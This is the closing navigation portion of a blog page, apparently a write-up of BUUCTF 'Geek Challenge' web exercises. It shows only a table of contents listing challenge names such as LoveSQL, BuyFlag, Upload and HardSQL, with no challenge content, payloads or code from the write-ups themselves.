class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-4"><span class="toc-number">5.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-4"><span class="toc-number">5.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-LoveSQL"><span class="toc-number">6.</span> <span class="toc-text">0x05 LoveSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-5"><span class="toc-number">6.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-5"><span class="toc-number">6.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-Http"><span class="toc-number">7.</span> <span class="toc-text">0x06 Http</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-6"><span class="toc-number">7.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-6"><span class="toc-number">7.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-BuyFlag"><span class="toc-number">8.</span> <span class="toc-text">0x07 BuyFlag</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-7"><span class="toc-number">8.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-7"><span class="toc-number">8.2.</span> <span class="toc-text">WriteUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Think"><span class="toc-number">8.3.</span> <span class="toc-text">Think</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-BabySQL"><span class="toc-number">9.</span> <span class="toc-text">0x08 BabySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-8"><span class="toc-number">9.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-8"><span class="toc-number">9.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-Upload"><span class="toc-number">10.</span> <span class="toc-text">0x09 Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-9"><span class="toc-number">10.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-9"><span class="toc-number">10.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x010-HardSQL"><span class="toc-number">11.</span> <span class="toc-text">0x010 HardSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-10"><span class="toc-number">11.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteUp-10"><span class="toc-number">11.2.</span> <span class="toc-text">WriteUp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x011-FinalSQL"><span class="toc-number">12.</span> <span class="toc-text">0x011 FinalSQL</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&text=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&is_video=false&description=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜&body=Check out this article: http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&title=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&name=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/02/27/BUU-Web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/&t=BUU-Webåˆ·é¢˜è®°å½• æå®¢å¤§æŒ‘æˆ˜"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021
    Du1L0v3
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
        
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
         <span id="busuanzi_container_site_pv">æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡</span>
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.2/css/all.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.bootcdn.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
